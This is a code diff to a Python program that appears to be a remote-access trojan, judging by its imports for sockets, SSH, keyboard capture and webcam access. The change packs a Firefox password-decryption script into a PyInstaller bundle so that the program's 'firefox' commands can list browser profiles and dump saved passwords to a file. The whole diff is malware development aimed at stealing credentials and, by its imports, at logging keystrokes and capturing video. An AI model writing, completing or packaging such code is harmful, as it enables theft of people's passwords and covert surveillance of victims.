@@ -2,7 +2,8 @@ import socket
 import ssl
 import time
 import subprocess
-import os 
+import os
+import sys
 import paramiko
 from pynput import keyboard
 import threading
@@ -14,9 +15,14 @@ import cv2
 # ========== COMMANDES PERSONNALISÉES ==========
 
 # COMMANDE : firefox
+def resource_path(relative_path):
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.abspath(relative_path)
+
 def list_firefox_profiles():
     try:
-        script_path = os.path.join(os.path.dirname(__file__), "firefox_decrypt.py")
+        script_path = resource_path("firefox_decrypt.py")
         result = subprocess.run(
             ["python3", script_path, "-l", "--no-interactive"],
             capture_output=True,
@@ -30,7 +36,7 @@ def list_firefox_profiles():
 
 def get_firefox_passwords(profile_number, output_file="firefox_passwords.txt"):
     try:
-        script_path = os.path.join(os.path.dirname(__file__), "firefox_decrypt.py")
+        script_path = resource_path("firefox_decrypt.py")
         result = subprocess.run(
             ["python3", script_path, "-f", "human", "--no-interactive", "-c", profile_number],
             capture_output=True,
